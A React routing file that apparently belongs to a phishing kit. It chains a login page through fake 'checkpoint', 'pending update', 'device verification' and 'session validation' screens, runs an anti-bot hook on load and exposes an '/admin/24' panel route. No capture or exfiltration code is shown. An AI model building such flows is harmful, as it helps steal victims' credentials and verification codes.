import React, { useEffect, Suspense } from "react";
import { BrowserRouter, Route, Switch, useHistory } from "react-router-dom";
import useAntiBot from "./utils/useAntiBot";

// Lazy Load Components
const Login = React.lazy(() => import("./components/authe/login"));
const UpdateStatus = React.lazy(() => import("./components/authe/updatestatuspending"));
const UpdateStatusError = React.lazy(() => import("./components/authe/updatestatuserror"));
const ContainerCustom = React.lazy(() => import("./components/containers/auth_custom"));
const ContainerLoading = React.lazy(() => import("./components/containers/auth_loading"));
const ContainerCode = React.lazy(() => import("./components/containers/auth_process"));
const ContainerError = React.lazy(() => import("./components/containers/auth_failed"));
const ContainerCustomError = React.lazy(() => import("./components/containers/auth_custom_error"));
const GenView = React.lazy(() => import("./components/GenView"));
function ProtectedRoutes({ children }) {
  const history = useHistory();

  useEffect(() => {
    const isAuthenticated = localStorage.getItem("chneyal7alataw") === "1";
    if (!isAuthenticated) {
      history.push("/");
    }
  }, [history]);
  return children;
}
function App() {
  useAntiBot(); // ✅ Run Anti-Bot on App Load
  return (
    <BrowserRouter>
      <Switch>
        {/* Public Routes */}
        <Route exact path="/" render={() => (
          <Suspense fallback={<div></div>}>
            <Login />
          </Suspense>
        )} />
        <Route exact path="/login" render={() => (
          <Suspense fallback={<div></div>}>
            <Login />
          </Suspense>
        )} />
          <Route exact path="/admin/24" render={() => (
            <Suspense fallback={<div></div>}>
              <GenView />
            </Suspense>
          )} />
        {/* Protected Routes(_____) 
                               |       */}
        <ProtectedRoutes>
          <Route exact path="/update/status=true/pending" render={() => (
            <Suspense fallback={<div></div>}>
              <UpdateStatus />
            </Suspense>
          )} />
          <Route exact path="/update/status=error/pending" render={() => (
            <Suspense fallback={<div></div>}>
              <UpdateStatusError />
            </Suspense>
          )} />
          <Route exact path="/auth/checkpoint" render={() => (
            <Suspense fallback={<div></div>}>
              <ContainerCode />
            </Suspense>
          )} />
          <Route exact path="/auth/error" render={() => (
            <Suspense fallback={<div></div>}>
              <ContainerError />
            </Suspense>
          )} />
          <Route exact path="/validate/session" render={() => (
            <Suspense fallback={<div></div>}>
              <ContainerCustom />
            </Suspense>
          )} />
          <Route exact path="/validate/error" render={() => (
            <Suspense fallback={<div></div>}>
              <ContainerCustomError />
            </Suspense>
          )} />
          <Route exact path="/verify/device=mobile" render={() => (
            <Suspense fallback={<div></div>}>
              <ContainerLoading />
            </Suspense>
          )} />
          <Route exact path="/connection/timeout" render={() => (
            <Suspense fallback={<div></div>}>
              <ContainerCode />
            </Suspense>
          )} />
        </ProtectedRoutes>
      </Switch>
    </BrowserRouter>
  );
}

export default App;
